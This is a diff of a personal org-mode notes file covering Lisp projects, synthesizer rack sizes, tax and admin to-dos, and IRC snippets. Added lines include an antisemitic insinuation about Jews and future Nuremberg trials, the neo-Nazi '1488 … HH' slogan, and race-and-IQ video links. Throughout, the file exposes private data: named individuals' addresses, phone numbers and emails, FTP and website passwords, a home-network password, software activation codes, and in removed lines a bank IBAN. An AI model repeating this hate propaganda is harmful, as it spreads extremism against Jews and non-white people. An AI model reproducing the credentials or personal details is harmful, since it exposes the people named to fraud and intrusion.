@@ -1,6 +1,84 @@
 -*- mode:org; coding:utf-8 -*-
 (setf org-todo-keywords (quote ((sequence "TODO(t@)" "IN-PROGRESS(p@)" "SUSPENDED(s@)" "|" "DONE(d@)" "CANCELED(c@)"))))
 
+Les juifs qui ont du quitter l'Allemagne en 1933 sont revenus pour soumettre ceux qui étaient au pouvoir au tribunal de Nuremberg 12 ans plus tard.  De nos jours, les rabbins conseillent aux juifs de quitter l'Europe.  Qui sera les accusés dans 12 ans?
+
+LLVM IR to CL transpiler: https://github.com/froggey/Iota
+
+* freenode.org
+
+    freenode.org:  list of ops can be found with:  /msg ChanServ access #lisp list
+    irc://irc.freenode.org/lisp   /msg alis list * -topic *lisp*
+
+> fwiw, i mentioned in #lisp :
+<ski> <@netoper:#freenode> channel's opped user where sigyn is present can request /msg Sigyn unkline $nick when the user was recently klined by Sigyn from their channel
+<ski> <someone:#freenode> netoper, how many times can we do this?
+<ski> <@netoper:#freenode> someone: you have around 15 minutes to do that
+<pjb> thanks.
+   *** ski is AWAY: Security System Breached
+<ski> (otherwise, iiuc, the protocol is to request via email that one's kline should be removed, which will typically take at least several hours i imagine)
+<ski> (in any case, i already talked to an op in #freenode about it, and they said they lifted it)
+<ski> i'm just mentioning this, for possible future use. i've noticed a handful of such misfirings in the past (including having experienced it myself)
+ski
+
+* Et pendant ce temps:
+
+Elon Musk Gives Updates on Mission to Mars.
+https://www.youtube.com/watch?v=XcVpMJp9Th4
+
+Elon Musk: Anywhere in the World in Less Than One Hour.
+https://www.youtube.com/watch?v=aMmka9cVFWc
+
+Concernant les problèmes de climat et d'énergie, en résumé:
+
+Protéger l'humanité des ouragans... de l'espace !
+https://www.youtube.com/watch?v=d0nl-nhzTWI
+https://www.youtube.com/channel/UCTiL1q9YbrVam5nP2xzFTWQ
+
+
+Pierre Yves Rougeyron : La France vassale
+https://www.youtube.com/watch?v=3x5lI3hJocM
+
+Asselineau: Siemens, budget, discours de Macron, Sénatoriales, Catalogne - Entretien n°49
+https://www.youtube.com/watch?v=ACkF8Na1JC4
+
+
+Jordan Peterson - IQ and The Job Market
+https://www.youtube.com/watch?v=fjs2gPa5sD0
+
+Jordan Peterson - The Mystery of High IQ and Industriousness
+https://www.youtube.com/watch?v=1C0zS2RAzlI
+
+Jordan Peterson - Controversial Facts about IQ
+https://www.youtube.com/watch?v=jSo5v5t4OQM
+
+Dr. John Philippe Rushton - Race and IQ
+https://www.youtube.com/watch?v=yZ65PSrSgAo
+
+* Angelo
+
+Dott. Ing. Angelo Rossi
+Via delle Albizzie, 21
+00172 Roma, Italia
+3293516963
+
+* progonline prospection
+** Tableau Server - Tableau Software - Paris
+
+http://www.progonline.com/mypage.php?quoi=voir_projet&id=21725
+http://www.progonline.com/mypage.php?quoi=coordonnees_client&nick=baldellon&page=projet&id=21725&accord_conso_credit=1
+
+ Nom du client : Michel BALDELLON
+
+ Email : michel.baldellon@checkndo.com
+
+ Numéro de téléphone fixe : (+33)143251500
+
+ Numéro de téléphone portable : (+33)673845775
+
+ Les coordonnées du client viennent de vous être envoyées également par mail.
+
+* new notes
 WaveLab LE 9 activation code: 0240 7CVN NVUM VTSU TTYF EJ00 158F 8F3E
 Cubase  LE 9 activation code: 0240 7CDE CVHZ UMHW WBKC GB00 16C1 8928
 
@@ -14,7 +92,6 @@ NEO900 Nokia
 
 
 #+BEGIN_SRC(shell)
-sudo caffeinate port selfupdate && sudo caffeinate port upgrade outdated && sudo caffeinate port rev-upgrade
 
 function playEachFlacInDirectories(){ export COLUMNS ; for d in "$@" ; do for f in "$d"/*.flac ; do banner "$(echo $(basename $f .flac)|sed -e 's/^[0-9]*-*//' -e 's/-/ /g')" ; mplayer "$f" ; done ; done ; }
 
@@ -29,9 +106,135 @@ http://incudine.sourceforge.net/tutorial_jackmidi.html
 | 10.10 Yosemite | 5.5.1 | 6.0 6.1 7.0 7.1 |
 |                |       |                 |
 
+
+Taille maillot:  Capel/US: 9R/5XL, 7L/3XLT
+Taille pantalon: Capel: 76E
+
+* Music
+** Triadex
+http://till.com/articles/muse/
+http://www.synthtopia.com/content/2017/09/06/triadex-muse-synthesizer-in-your-web-browser/
+
+* Synthesizers
+** Rack-19
+
+(mapcar (lambda (mm)
+                   (let ((inch  (/ mm 25.40)))
+                     (multiple-value-bind (iinch dinch)  (truncate inch)
+                       (list iinch (/  (round (* 16 dinch)) 16)))))
+                 '(482.0 233.2 87.1))
+
+
+(+ 7 5 5 3 2 3) 25U
+
+(list (+ 3 2 3 )
+      (+ 7 5 5 ))  --> (8U 17U)
+
+(list (+ 3 2 3 5)
+      (+ 7 5 ))    --> (13U 12U)
+
+(+ 97 430) 527
+
+
+https://megacase.com/fr/produit/rack-19-pro/
+*** rack ibiza                            9U+12U      555 x  560 x 1050 mm
+*** Berhinger Xenyx X1832USB              19" 7U      408 x  367 x   97 mm
+
+97 x 408 x 367
+5"3/8 x 16"1⁄2 x 17"1⁄4"
+
+*** Korg Radias                           19" 5U      482 x   76 x  185 mm
+
+482 mm × 185 mm × 76 mm
+(18.98" × 7.28" × 2.99")
+
+*** Korg MS2000R                          19" 5U      482 x   87 x  233 mm
+
+482.0 (W) × 233.2 (D) × 87.1 (H) mm
+((18 1) (9 3/16) (3 7/16))
+
+*** Korg DSM-1                            19" 3U      433 x  430 x  134 mm
+
+433 (w) x 134 (h) x 430 (d) mm
+((17 1/16) (5 1/4) (16 15/16))
+
+*** Korg EX-8000                          19" 2U      430 x  413 x   90 mm
+
+430 (w) x 90 (h) x 412 (d) mm
+((16 15/16) (3 9/16) (16 1/4))
+
+*** Yamaha ES5R                           19" 3U      480 x  397 x  138 mm
+
+480 (W) x 138 (H) x 397 (D)
+(18 7/8" x 5 5/12" x 15 2/3")
+
+** Future Synthesizers
+*** Doepfer                 A-100                      2500 €               modular
+http://www.doepfer.de/a100e.htm
+
+*** Dave Smith Instruments  Prophet Rev2-16 Desktop    2219 €  20170910     16 voices
+https://www.davesmithinstruments.com/product/prophet-rev2-desktop/
+
+*** Dave Smith Instruments  Prophet Rev2-8  Desktop    1399 €  20170910      8 voices
+https://www.davesmithinstruments.com/product/prophet-rev2-desktop/
+
+*** Novation                Peak                       1325 €  20170929      8 voices
+*** Futuresonus             Parva                      1000 €                8 voices
+https://futureson.us
+
+*** Asturia                 MatrixBrute                1999 €               mono CV in/out
+https://www.arturia.com/products/matrixbrute/overview
+*** HyperSynth              Xenophone                   975 €               mono
+http://www.hypersynth.com/xenophone.html
+
+*** MFB                     Dominion
+*** KAWAI                   K4R                         200 €
+
+** Synthesizers
+
+(* 70 4)280
+(+ 5.9 10 24.1 17.5 10.9)68.4
+(+ 5.9 10.0 24.1 17.5 10.9 7.5)75.9
+*** Alesis V61                             5.9 kg    1120 x 315 x 115 mm
+*** Moog Subsequent 37 cv                 10.0 kg     680 x 375 x 170 mm
+*** Schmidt Synthesizer                   45.0 kg    1140 x 610 x 140 mm
+*** Korg KRONOS-2 88                      24.1 kg    1433 x 371 x 148 mm
+*** Korg DSS-1                            17.5 kg    1171 x 436 x 123 mm
+*** Korg DW-8000                          10.9 kg     998 x 338 x 101 mm
+*** Korg EX-8000                           7.5 kg     430 x 413 x  90 mm
+*** Korg MEX-8000
+* nntp usenet news : old articles
+> If you have the message id you can try your luck at
+>  (concat
+>    "http://al.howardknight.net/msgid.cgi?STYPE=msgid&A=0&MSGI="
+>     ["<"] msgid [">"])
+>
+> but this may also be a google setup
+
+al.howardknight.net  is an intriguing case. The site seems to have messages
+going back decades but how it does it I have no idea ; I'd love to know
+though. When you say "google setup" do you mean that behind the scenes it
+might search googlegroups and get the message from there ?
+
 * Lisp Tasks
 ** TODO locate old libraries, evaluate them and if interesting, upgrade them (asdf, quicklisp). Document on cliki.net.
 * NOTES
+** MidiQuest
+
+Url: ftp.soundquest.org
+Username: MidiQuest10@soundquest.org
+Password: MidiQuest10Download
+
+
+Url: ftp.soundquest.org
+Username: MidiQuest11@soundquest.org
+Password: MidiQuest11Download
+
+ftp://MidiQuest11%40soundquest.org:MidiQuest11Download@ftp.soundquest.org
+Username: MidiQuest11@soundquest.org
+Password: MidiQuest11Download
+
+
 ** Coupons
 *** http://www.synthmaster.com/synthmasterone.aspx?referrer=adwords&campaign=springsale2017inthemarket
 Your 10% OFF discount coupon code is: JAN1720PCTOFF
@@ -423,6 +626,40 @@ https://xcloud.me
 
 g4: bitcoin:1NRCovXU8EiDby7PMbmayxT4TtqPenpPhv
 
+
+  bitcoin has the following notes:
+    1.  A launch daemon entry has been created for bitcoin. It is disabled
+        by default. To enable and load the daemon:
+
+        cmd$ sudo launchctl load -w "/Library/LaunchDaemons/org.macports.bitcoin.plist"
+
+    2.  Edit "/opt/local/var/lib/bitcoind/" and "$HOME/Library/Application Support/Bitcoin/bitcoin.conf" to include
+        the RPC credentials.  See
+        <https://github.com/bitcoin/bitcoin/blob/master/doc/build-osx.md#running>
+        for more information.
+
+            mkdir -p "/Users/${USER}/Library/Application Support/Bitcoin"
+            echo -e "rpcuser=bitcoinrpc\nrpcpassword=$(xxd -l 16 -p /dev/urandom)" > "/Users/${USER}/Library/Application Support/Bitcoin/bitcoin.conf"
+            chmod 600 "/Users/${USER}/Library/Application Support/Bitcoin/bitcoin.conf"
+
+    3.  To start the daemon manually in the background:
+
+        cmd$ /opt/local/bin/bitcoind -daemon
+
+    3.  To view the daemon configuration:
+
+        # Daemon:
+        cmd$ less "/opt/local/etc/bitcoin/bitcoin.conf"
+        # GUI:
+        cmd$ less "$HOME/Library/Application Support/Bitcoin/bitcoin.conf"
+
+    4.  To view the logs:
+
+        # Daemon:
+        cmd$ tail -F "/opt/local/var/lib/bitcoind/debug.log"
+        # GUI:
+        cmd$ tail -F "$HOME/Library/Application Support/Bitcoin/debug.log"
+
 ** Paypal Me
 
 x-webdoc://6D44C5C4-BFE7-4932-804A-DC6B25E86479/PayPal.me/informatimago?ppid=PPC000628&cnac=FR&rsta=fr_FR(fr_FR)&cust=CGV72WR5AT4E6&unptid=cf444db4-5cb4-11e6-aad2-441ea14ddefc&t=&cal=412bb21569c35&calc=412bb21569c35&calf=412bb21569c35&unp_tpcid=ppme-social-user-profile-created&page=main:email&pgrp=main:email&e=op&mchn=em&s=ci&mail=sysx-webdoc://6D44C5C4-BFE7-4932-804A-DC6B25E86479/PayPal.me/informatimago?ppid=PPC000628&cnac=FR&rsta=fr_FR(fr_FR)&cust=CGV72WR5AT4E6&unptid=cf444db4-5cb4-11e6-aad2-441ea14ddefc&t=&cal=412bb21569c35&calc=412bb21569c35&calf=412bb21569c35&unp_tpcid=ppme-social-user-profile-created&page=main:email&pgrp=main:email&e=op&mchn=em&s=ci&mail=sys
@@ -711,37 +948,6 @@ http://www.infoq.com/presentations/We-Really-Dont-Know-How-To-Compute
 *** debian 8
 systemctl status movies-swap.swap
 
-*** port
-export GRADLE_HOME=/opt/local/share/java/gradle
-sudo port select --set maven maven3
-
-port select --set pip pip27
-port select --set pip pip33
-port select --set pip pip34
-port select --set cython cython27
-port select --set cython cython34
-
-
-If this is a new install you might want to run:
-$ sudo -u _mysql /opt/local/lib/mysql56/bin/mysql_install_db
-
-
-sudo port install port_cutleaves
-sudo port_cutleaves
-sudo port upgrade outdated
-sudo port clean --all installed
-sudo port uninstall mysql5-server
-sudo port uninstall mysql5
-sudo port install mysql56
-sudo port list select mysql56 mysql56 @5.6.21 databases/mysql56
-
-sudo port upgrade cppunit configure.compiler=macports-gcc-4.8
-
-Apple X11.app:    defaults write org.x.X11        enable_test_extensions -boolean true
-MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true
-defaults read  org.macports.X11 enable_test_extensions
-defaults read  org.x.X11        enable_test_extensions
-
 *** Mysql
 
 To start mysqld at boot time you have to copy
@@ -786,25 +992,10 @@ WARNING: Could not copy config file template /opt/local/share/mysql56/support-fi
 You may want to copy the file manually, or create your own,
 it will then be used by default by the server when you start it.
 
-*** port: Installing ECL on MacOSX Yosemite
-http://stackoverflow.com/questions/27976312/how-to-cope-with-non-gcc-compatible-code-in-os-x-yosemite-core-headers/28014302#28014302
-
-> port install ecl
-
-fails like this when using a gcc version < 5.
-You can switch to gcc5:
-
->    port install gcc5
->    port select gcc mp-gcc5
->    port install ecl
-
-(but then, it looks like gcc5 can't compile mit-scheme, so you may have to switch back to gcc49 for mit-scheme.
-
 ** NOTES 9
 
 (alexandria:hash-table-alist asdf/source-registry::*source-registry*)
 
-coinbase|pjb@informatimago.com|byWi-fYSXocWiD]kid
 
 http://www.digitalcombatsimulator.com/|pjb@informatimago.com|Multiplayer3
 
@@ -1022,49 +1213,17 @@ Nasium LSE:              telnet://voyager.informatimago.com:8115
 
      http://www.danbricklin.com/200yearsoftware.htm
 
+** Combat
+
+1488 We must secure the existence of our people and a future for white children. HH.
+     Nous devons assurer l\'existence de notre peuple et un futur pour les enfants blancs. HH.
+
 * ACTIONS
 ** A-FAIRE, TODO, ENCOURS
 *** Real                                                               :real:
-**** TODO [#A] Photos pour CV, CI, Passeport                          :admin:
-**** TODO [#A] Carte d'Identité & Passeport                           :admin:
-
-Passeport:
-
-- Une photo d'identité conforme aux normes
-
-- Justificatif de domicile : original + photocopie
-
-- Votre passeport sécurisé (biométrique ou électronique) valide ou
-  périmé depuis moins de 5 ans ou ou passeport Delphine valide ou
-  périmé depuis moins de 2 ans : original + photocopie
-
-- Acte de naissance (copie intégrale ou extrait avec filiation) de
-  moins de 3 mois : original
-
-
-Carte d'identité:
-
-- Une photo d'identité conforme aux normes
-
-- Numéro de pré-demande ou formulaire cartonné remis sur place
-
-- 86 € en timbre fiscal : achat en ligne
-
-- Justificatif du domicile : original + photocopie
-
-- Carte d'identité (valide ou périmée depuis moins de 5 ans) : original + photocopie
-
-- Acte de naissance (copie intégrale ou extrait avec filiation) de moins de 3 mois : original
-
-
-
-
-**** TODO [#A] Donner Ordinateur                                      :admin:
 **** TODO [#A] Donner CDs                                             :admin:
-**** TODO [#A] Dentiste - references implant                          :admin:
-**** TODO [#A] Résilier abonnements                                   :admin:
 **** TODO [#A] Impôts                                          :impots:admin:
-     :DEADLINE: <2016-03-15 -15d>
+     :DEADLINE: <2017-10-01 -1m>
 
 
 http://ec.europa.eu/taxation_customs/vies/viesquer.do?ms=FR&vat=65348673146
@@ -1079,35 +1238,26 @@ msa.fr -> cotisant de solidarité
 IMPOTS: phoneto:0810009393 mailto:cdi.pantin@dgfip.finances.gouv.fr
 ~/jobs/free-lance/aeat/aeat-2008
 
-***** DONE [#A] TVA 2017T1
-      CLOSED: [2017-04-04 Tue 03:19] :DEADLINE: <2017-04-01>
-      - State "DONE"       from "TODO"       [2017-04-04 Tue 03:19] \\
-        3310CA3 Déclaration 3310CA3 initiale déposée le 04 Avril 2017 à 03:10 25/04/2017 3 826,00 € 3 826,00 € 0,00 €
-        Votre ordre de paiement a bien été enregistré le 04/04/2017 à 03:10 :
-        sous le numéro 700048652350 sur le compte bancaire FR7630004021900001005698318 (établissement teneur du compte : BNPPARB ISSY MOULX OUEST
-        et titulaire du compte : MONSIEUR BOURGUIGNON PASCAL)
-        pour un montant de 3 826,00 €.
-        Le mandat qui autorise ce prélèvement porte la Référence Unique de Mandat (RUM) n°
-        Le prélèvement interviendra à compter du 25/04/2017
-        Ces références vous seront réclamées en cas de contestation.
-        Nous vous conseillons de noter les informations ou d'imprimer cette page.
-        Les détails relatifs à vos paiements sont consultables dans votre compte fiscal
-        au sein de votre espace abonné, 24 heures après la validation de l'ordre de paiement.
-        nn348673146DGFIP2016839501IO93AWZD
-***** TODO [#A] TVA 2017T2
-     :DEADLINE: <2017-07-01>
-***** TODO [#A] TVA 2017T3
-     :DEADLINE: <2017-10-01>
-***** TODO [#A] TVA 2017T4
-     :DEADLINE: <2018-01-01>
-***** TODO [#A] Taxe d'habitation 2015
-***** TODO [#A] Taxe d'habitation 2016
-***** TODO [#A] Impôt sur le revenu 2012
-***** TODO [#A] Impôt sur le revenu 2013
-***** TODO [#A] Impôt sur le revenu 2014
-***** TODO [#A] Impôt sur le revenu 2015
+***** DONE [#A] Taxe d'habitation 2015
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
+***** DONE [#A] Taxe d'habitation 2016
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
+***** DONE [#A] Impôt sur le revenu 2012
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
+***** DONE [#A] Impôt sur le revenu 2013
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
+***** DONE [#A] Impôt sur le revenu 2014
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
+***** DONE [#A] Impôt sur le revenu 2015
+      CLOSED: [2017-09-11 Mon 06:25]
+      - State "DONE"       from "TODO"       [2017-09-11 Mon 06:25]
 **** TODO [#A] [0/6] Emploi                                             :job:
-     :DEADLINE: <2016-06-30 -1m>
+     :DEADLINE: <2017-10-01 -2m>
 
 jobs: http://www.odesk.com
 
@@ -1138,15 +1288,64 @@ http://beknown.com/pascal-bourguignon
 **** TODO [#A] Espagne: fermer compte cajamar valencia                :admin:
 **** TODO [#A] Espagne: assigner telephone openbank                   :admin:
 pour les cles sinon fermer compte openbank -> virement a cajama
-**** TODO [#C] Chez Joëlle:                                           :admin:
+**** TODO [#C] Chez Joëlle                                            :admin:
 - CD À RECOMPRESSER
   robert-schroeder/computer-voice/05-back-to-the-earth
   robert-schroeder/computer-voice/06-rotary-motion
 - Relire tous les CD en format .flac
   (2 or 4 days, if the other half of the CD have been retrieved).
 - Have all the diapositive digitalized (~ 1000 EUR ?)
-- Vendre ma part de terrain de Volstroff à Joëlle. (~ 8000 EUR).
 
+**** DONE [#A] Photos pour CV, CI, Passeport                          :admin:
+     CLOSED: [2017-09-11 Mon 06:20]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:20]
+**** DONE [#A] Carte d'Identité & Passeport                           :admin:
+     CLOSED: [2017-09-11 Mon 06:20]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:20]
+
+Passeport:
+
+- Une photo d'identité conforme aux normes
+
+- Justificatif de domicile : original + photocopie
+
+- Votre passeport sécurisé (biométrique ou électronique) valide ou
+  périmé depuis moins de 5 ans ou ou passeport Delphine valide ou
+  périmé depuis moins de 2 ans : original + photocopie
+
+- Acte de naissance (copie intégrale ou extrait avec filiation) de
+  moins de 3 mois : original
+
+
+Carte d'identité:
+
+- Une photo d'identité conforme aux normes
+
+- Numéro de pré-demande ou formulaire cartonné remis sur place
+
+- 86 € en timbre fiscal : achat en ligne
+
+- Justificatif du domicile : original + photocopie
+
+- Carte d'identité (valide ou périmée depuis moins de 5 ans) : original + photocopie
+
+- Acte de naissance (copie intégrale ou extrait avec filiation) de moins de 3 mois : original
+
+**** DONE [#A] Donner Ordinateur                                      :admin:
+     CLOSED: [2017-09-11 Mon 06:20]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:20]
+Donné à Angelo Rossi.
+**** DONE [#A] Dentiste - references implant                          :admin:
+     CLOSED: [2017-09-11 Mon 06:22]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:22]
+
+Références implant dentiste
+IMPLANT DIFFUSION INTERNATIONAL
+Référence H01250
+
+**** DONE [#A] Résilier abonnements                                   :admin:
+     CLOSED: [2017-09-11 Mon 06:21]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:21]
 **** DONE [#A] Rendez vous Ophtalmologiste                            :admin:
      CLOSED: [2016-12-03 Sat 20:00]
      - State "DONE"       from "TODO"       [2016-12-03 Sat 20:00]
@@ -1198,7 +1397,10 @@ HILISP (Hitachi Interactive Lisp)
 Harlequin Common Lisp (LispWorks was the IDE)
 
 **** TODO [#A] digitize movie DVDs.                                   :admin:
-     :DEADLINE: <2016-08-31 -2m>
+     :DEADLINE: <2017-09-30 -2m>
+Basically Done.
+Have to check them.
+
 **** TODO [0/4] Organize my music files                               :admin:
 ***** TODO [#B] group files ~/bin/group-files the-ventures the-surfaris the-surf-coasters the-chantays dario-moreno/compilation-sorted/
 ***** TODO [#B] reconcile md5sums in /data/sound/flac.sums /data/sound/music-flac.sums
@@ -1216,9 +1418,13 @@ https://letsencrypt.org/
 http://erik.io/blog/2013/06/08/a-basic-guide-to-when-and-how-to-deploy-https/
 http://news.softpedia.com/news/attackers-can-hijack-95-percent-of-all-https-connections-501924.shtml
 **** TODO [#A] OGAMITA.COM renewal                                    :admin:
-     :DEADLINE: <2017-06-01 -1m>
+     :DEADLINE: <2018-06-01 -1m>
+     CLOSED: [2017-09-11 Mon 06:33]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:33]
 **** TODO [#A] INFORMATIMAGO.COM renewal                              :admin:
-     :DEADLINE: <2017-06-01 -1m>
+     :DEADLINE: <2018-06-01 -1m>
+     CLOSED: [2017-09-11 Mon 06:34]
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:34]
 **** TODO [#A] OGAMITA.ORG renewal                                    :admin:
      :DEADLINE: <2017-11-01 -1m>
 **** TODO [#A] OGAMITA.NET renewal                                    :admin:
@@ -1226,9 +1432,9 @@ http://news.softpedia.com/news/attackers-can-hijack-95-percent-of-all-https-conn
 **** TODO [#A] PARROQUIAS-MANGA.ORG renewal                           :admin:
      :DEADLINE: <2017-11-01 -1m>
 **** TODO [#B] move domain names to another DNS                       :admin:
-     :DEADLINE: <2016-12-30 -5m>
+     :DEADLINE: <2018-03-31 -9m>
 **** TODO [#B] move parroquias-manga.org to a Spanish host            :admin:
-     :DEADLINE: <2016-12-30 -5m>
+     :DEADLINE: <2018-03-31 -9m>
 **** TODO [#A] VirtualBox :macosx:
 Configure MacOSX systems & Xcode of various versions in VirtualBox disk images.
 (Maverick  10.9  Xcode 5) (galatea)
@@ -1298,7 +1504,10 @@ Numéro de transaction :	769500
 Référence commande :	170405210430
 Montant :	4 148,00 EUR
 
-**** TODO Moog Subsequent 37 CV                                   :woodbrass:
+**** DONE Moog Subsequent 37 CV                                   :woodbrass:
+     CLOSED: [2017-09-17 Sun 23:15]
+     - State "DONE"       from "TODO"       [2017-09-17 Sun 23:15] \\
+       Delivery on September 13th 2017
 
 **** TODO [#C] warthog hotas                                         :amazon:
 *** A-VOIR                                                            :watch:
@@ -1359,7 +1568,6 @@ https://www.youtube.com/watch?v=NiBDin5nxd4  Jean Gabin 1935 Crimes et chatiment
 
 https://skillsmatter.com/skillscasts/3504-lightning-talk-dider-verna-death-by-obesity#showModal?modal-signup-complete
 
-Replace "youtube" with "listentoyoutube" in the URL to download the audio of the video.
 Replace "youtube" with "ssyoutube" in the URL to download the video in any quality available.
 Replace "youtube" with "nsfwyoutube" to bypass age restriction.
 Replace "youtube" with "youtubeskip" in the URL and you won't see ads.
@@ -2151,7 +2359,7 @@ Year   Infl.Corr/Year   Total Remaining  Spared
 ----   ---------------  ---------------  ---------------
 2015:        18.179,66       343.270,80
 2016:        19.270,44       325.091,12         21417.00
-2017:        20.426,67       305.820,68
+2017:        20.426,67       305.820,68         21417.00
 2018:        21.652,27       285.394,04
 2019:        22.951,40       263.741,76
 2020:        24.328,49       240.790,34
@@ -2348,14 +2556,21 @@ Eventually will need to buy two more tenkeys keyboards: one for mac, one for fli
        Bought.
 
 *** Comptabilité                                                 :accounting:
+
+- séparé chaque facture de invoice/20160000-bnp.pdf dans des fichiers séparés pour inclusion comme justificatifs.
+-
+
+
+
 **** TODO [#A] payer loyer          672.77 €
-     :DEADLINE: <2013-05-01 Wed +1m>
+     :DEADLINE: <2017-10-05 +1m>
+     - State "DONE"       from "TODO"       [2017-09-11 Mon 06:35]
      - State "DONE"       from "TODO"       [2017-05-04 Thi 15:56]
      - State "DONE"       from "TODO"       [2017-04-02 Sun 05:39]
      - State "DONE"       from "TODO"       [2013-06-29 Sat 15:22] \\
        Fait par virement de la BNP.
     :PROPERTIES:
-    :LAST_REPEAT: [2017-05-08 Mon 15:56]
+    :LAST_REPEAT: [2017-09-11 Mon 06:35]
     :END:
 **** DONE [#A] émettre facture
      CLOSED: [2017-05-27 Sat 03:28] :DEADLINE: <2013-05-01 Wed>
@@ -2927,7 +3142,7 @@ http://torrents.thepiratebay.org/5550739/FreeFalcon_5.5.5550739.TPB.torrent
       - Search algorithm.
 
 *** TODO [#A] ECL on Android: compile and install                :android:cl:
-    :DEADLINE: <2016-03-30 -2m>
+    :DEADLINE: <2017-10-01 -1m>
 Also, have a look at what would be involved at making it work on iOS too.
 **** ECL Android
 ../configure CC='arm-linux-androideabi-gcc -march=armv7-a -isysroot/opt/android-ndk/platforms/android-16/arch-arm -B/opt/android-ndk/platforms/android-16/arch-arm/usr/lib/' --host=arm-linux-androideabi --prefix=/vendor/lisp
@@ -2950,21 +3165,22 @@ mke2fs -L home -j /dev/sdf4
 http://funcall.posterous.com/ecl-on-iphone-redux
 
 *** TODO [#A] hangman-ios                                    :hangman:ios:cl:
-    :DEADLINE: <2016-03-30 -2m>
+    :DEADLINE: <2018-01-01 -4m>
 ~/src/public/games/hangman-ios/
 
 *** TODO [#B] Implement "stonedge" game on iPad.                     :ios:cl:
-   DEADLINE: <2016-09-01 -3m>
+    :DEADLINE: <2018-01-01 -4m>
 - playtomo-stonedge.lisp
 
-    :DEADLINE: <2016-06-30 -3m>
+
 *** TODO [#A] mocl test 2 (ios/android).                                 :cl:
-    :DEADLINE: <2016-03-30 -2m>
+    :DEADLINE: <2018-01-01 -4m>
 #+BEGIN(src)
 cd /Users/pjb/src/mocl ; make mocl-test
 #+END(src)
 *** TODO [#A] Failing test case in reader.lisp                           :cl:
-   :DEADLINE: <2016-03-31 -1m>
+   :DEADLINE: <2018-01-01 -4m>
+
 From: Orivej Desh <orivej@gmx.fr>
 Subject: Failing test case in informatimago/common-lisp/lisp-reader/reader.lisp
 To: Pascal J. Bourguignon <pjb@informatimago.com>
@@ -2979,7 +3195,7 @@ but its complex numbers testcase fails for me with a non default
 and maybe run the testcase with all supported values.
 
 *** TODO [#A] Implement C11 compiler/translator to lisp.           :emacs:cl:
-    :DEADLINE: <2016-09-30 -6m>
+    :DEADLINE: <2018-01-01 -6m>
 
 https://github.com/drh/lcc
 https://github.com/Kalimehtar/pcc1
@@ -3081,7 +3297,7 @@ diff /data/lisp/packages/net/common-lisp/cxml/cxml/xml/xml-parse.lisp /hubble/da
 >         (sax:element-declaration (handler *ctx*) element-name content-model)
 
 *** TODO [#B] Update web site with new cl packages.                   :admin:
-   DEADLINE: <2016-06-01 -6m>
+   DEADLINE: <2018-01-01 Mon -6m>
 com.informatimago.common-lisp
 <serichsen> pjb: I'm browsing http://informatimago.com/develop/lisp/index.html and the
 links to the individual packages are broken.
@@ -3157,7 +3373,7 @@ http://www.common-lisp.net/project/cl-objc/
 *** TODO [#C] melpa                                                   :admin:
  http://nic.ferrier.me.uk/blog/2012_07/emacs-packages-for-programmers
 *** TODO [#C] fcll blog                                                :blog:
-   DEADLINE: <2016-03-01 +1m -21d>
+   DEADLINE: <2017-10-01 +1m -1m>
 
 Example Soft OpCode VM + Assembler:
 http://www.informatimago.com/develop/lisp/small-cl-pgms/example-soft-opcodes.lisp
@@ -3213,7 +3429,7 @@ move http://www.informatimago.com/articles/flpl/flpl.html to smallclpgms
 *** TODO [#B] add usenet articles                                        :cl:
 add http://groups.google.com/group/comp.lang.lisp/msg/aa9494a2f0c35f74?hl=en to articles
 *** TODO [#B] flood protection in erc                                 :emacs:
-    :DEADLINE: <2016-06-01 -2m>
+    :DEADLINE: <2018-01-01 -6m>
 *** TODO [#B] cll archive                                                :cl:
 
 Gather and update a complete cll archive
@@ -4023,7 +4239,12 @@ Math chars:
 ℂℍℕℙℚℝℤℼℽℾℿ⅀ⅅⅆⅇⅈⅉ
 ℬℰℱℋℐℒℳ℘ℛ
 
+ℍℙℚℤℼℽℾℿ⅀ⅅⅆⅇⅈⅉ
 "─═┌╔┬╦┐╗├╠┼╬┤╣│║└╚┴╩┘╝"
+
+
+ℕ⊂ℤ⊂ℝ⊂ℂ but z=(n₁,n₂) and r=(zᵢ) and c=(r₁,r₂)
+S⊂C₁∩C₂∩…∩Cᵣ
 
 ┌────────────────────────┬────────┬──────┐
 │                        │        │      │
@@ -4459,7 +4680,7 @@ http://www.kimsufi.com/fr/ks/                  15 €/mois à  50 €/mois
 
 Pedido DELL: ES0132-5293-94854
 |11-30|01114694|DELL Pantalla 22" 2209WA             |   409.48|        409.48|
-DELL 2009WAf
+DELL 2009WA
 CN-0H735H-72872-98V-226L
 REV A01
 Made in China on August 2009
@@ -4944,18 +5165,19 @@ Contraseǹa Grupo en hogar en la red: uD7nx4tJ6F
 
 ** backups                                                          :virtual:
 *** TODO [#A] sauvegardes                                             :admin:
-    :DEADLINE: <2016-02-20 Sat +1w>
+    :DEADLINE: <2017-09-16 Sat +1w>
+    - State "DONE"       from "TODO"       [2017-09-11 Mon 06:44]
     - State "DONE"       from "TODO"       [2017-05-27 Sat 03:29]
     - State "DONE"       from "TODO"       [2016-02-06 Sat 21:45]
     - State "DONE"       from "TODO"       [2016-02-06 Sat 21:38] \\
       larissa backup 2.
     - State "DONE"       from "TODO"       [2012-12-13 Thu 00:47]
     :PROPERTIES:
-    :LAST_REPEAT: [2017-05-27 Sat 03:29]
+    :LAST_REPEAT: [2017-09-11 Mon 06:44]
     :END:
 Backup kuiper to external hard disks.
 *** TODO [#B] Implement an incremental backup for hubble              :admin:
-    :DEADLINE: <2016-03-01 Sun -3m>
+    :DEADLINE: <2018-02-01 -6m>
 *** Internal disks
 
